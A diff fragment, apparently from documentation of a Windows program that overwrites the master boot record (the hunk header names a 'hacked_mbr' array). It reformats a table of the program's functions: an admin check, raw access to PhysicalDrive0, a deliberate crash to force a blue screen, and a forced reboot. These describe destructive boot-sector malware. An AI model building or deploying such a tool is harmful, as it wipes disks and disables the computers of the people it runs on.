@@ -32,12 +32,18 @@ unsigned char hacked_mbr[MBR_SIZE] = {
 
 
 Function	Purpose	WinAPI Calls	Error Handling
+
 IsElevated()	Admin check	OpenProcessToken()
+
 GetTokenInformation()	Graceful exit
+
 GetPhysicalDriveHandle()	Raw disk access	CreateFileA("\\\\.\\PhysicalDrive0")	INVALID_HANDLE_VALUE
+
 TriggerBSOD()	Crash system	*(int*)0xDEADBEEF = 0x1337BEEF	Stack overflow
+
 AutoRestart()	Force reboot	ExitWindowsEx(EWX_FORCE | EWX_REBOOT)	AdjustTokenPrivileges()
-📊 Execution Flow
+
+# 📊 Execution Flow
 mermaid
 
 
